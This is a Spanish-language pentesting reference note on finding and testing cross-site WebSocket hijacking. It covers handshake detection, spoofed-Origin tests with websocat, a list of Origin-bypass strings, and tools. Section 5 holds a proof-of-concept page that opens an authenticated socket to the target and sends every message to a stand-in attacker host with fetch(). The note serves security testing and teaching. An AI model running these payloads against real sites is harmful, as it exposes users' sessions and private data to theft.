---
tipo: meta
aliases:
  - reconocimiento WebSocket
  - CSWSH PoC
  - detectar WebSocket
tags:
  - meta/referencia
  - dominio/web
---

# WebSocket - matriz de reconocimiento

> [!info] Referencia pura, no un zettel
> Detectar el WebSocket, probar la validación de origen, y armar la prueba de CSWSH. La manipulación del canal está en [[WebSocket - matriz de manipulación]]; el criterio, en [[MOC - WebSocket]].

## 1. Detectar que hay WebSocket

En el tráfico:

| Señal | Dónde |
|---|---|
| `Upgrade: websocket` + `Connection: Upgrade` | Cabeceras del handshake |
| `Sec-WebSocket-Key` / `Sec-WebSocket-Accept` | El handshake |
| Respuesta `101 Switching Protocols` | Confirma el upgrade |
| Esquema `ws://` o `wss://` | En el JS de la aplicación |
| `new WebSocket(...)` | En el código del cliente |

Buscar en el JS: `grep -oE 'wss?://[^"'\'']*'` sobre los scripts.

## 2. Anatomía del handshake

```http
GET /chat HTTP/1.1
Host: objetivo.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://objetivo.com          ← lo que hay que atacar
Cookie: session=...                    ← viaja solo, como cualquier GET
```

El `Origin` es la defensa; la `Cookie` es lo que hace posible el secuestro. Que la cookie viaje sola es lo que convierte el handshake en un CSRF.

## 3. Probar la validación de origen

La prueba de apertura del dominio. Ver [[WebSocket - secuestro entre sitios]].

Repetir el handshake cambiando el `Origin`:

```
Origin: https://atacante.com
```

| Respuesta | Qué significa |
|---|---|
| `101` y el socket abre y funciona | **No valida el origen** → CSWSH |
| `403` / cierre inmediato | Valida. Probar bypass de cadena, § 4 |
| Abre pero no autentica | El socket pide un token aparte → [[WebSocket - confianza del canal]] |

Con `curl` o `websocat`:

```sh
websocat -H 'Origin: https://atacante.com' -H 'Cookie: session=...' wss://objetivo.com/chat
```

Si conecta y recibe mensajes con un origen ajeno, está.

## 4. Bypass de validación de origen laxa

Cuando valida pero mal, es el mismo problema que comparar un origen en cualquier lado — reusa [[CORS bypass de origen - matriz de referencia]]:

`Origin: https://objetivo.com.atacante.com`   (prefijo)
`Origin: https://atacanteobjetivo.com`        (sufijo)
`Origin: null`                                 (contextos sandbox)
`Origin: https://sub.objetivo.com`             (comodín de subdominio)

## 5. Prueba de concepto de CSWSH

La página del atacante:

```html
<script>
  var ws = new WebSocket('wss://objetivo.com/chat');
  ws.onopen = function() {
    ws.send('{"action":"getChatHistory"}');
  };
  ws.onmessage = function(e) {
    fetch('https://atacante.com/log?d=' + encodeURIComponent(e.data));
  };
</script>
```

`onopen` dispara la acción; `onmessage` exfiltra cada respuesta al servidor del atacante. La víctima solo abre la página, autenticada.

Para demostrar escritura, mandar una acción que cambie estado en `onopen`.

## 6. Herramientas

| Herramienta | Para qué |
|---|---|
| Burp Repeater (modo WebSocket) | Interceptar, editar y reenviar mensajes |
| Burp Proxy → WebSockets history | Ver todo el tráfico de mensajes |
| `websocat` | Cliente de línea de comandos, con cabeceras arbitrarias |
| `wsrepl` / `wscat` | Clientes interactivos |
| STEWS | Escáner de seguridad de WebSocket, detecta CSWSH |

## 7. Mapear el protocolo de mensajes

Antes de manipular, entender qué habla la aplicación por el socket. Observar el tráfico legítimo:

- Qué formato: JSON, texto plano, binario, un protocolo propio.
- Qué acciones acepta: `action`, `type`, `cmd` como clave.
- Qué campos llevan identificadores, precios, roles — candidatos de [[WebSocket - matriz de manipulación]].
- Si hay un mensaje de autenticación posterior al handshake — decide si el secuestro aplica.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El handshake con `Origin` ajeno abre | No valida origen: CSWSH confirmado |
| Cierra al primer mensaje | Puede pedir autenticación por mensaje. Ver el protocolo |
| `101` pero no llegan mensajes | El socket necesita un mensaje de suscripción o de auth primero |
| Valida el origen exacto | Probar bypass de cadena, § 4; si no, rama cerrada |
| El JS no muestra `new WebSocket` | Puede usar una biblioteca (socket.io); buscar su patrón |
| socket.io en vez de WebSocket puro | Tiene su propio handshake y reconexión; el origen se prueba igual |

## Relacionadas

[[MOC - WebSocket]] · [[WebSocket - matriz de manipulación]] · [[WebSocket - secuestro entre sitios]] · [[CORS bypass de origen - matriz de referencia]]
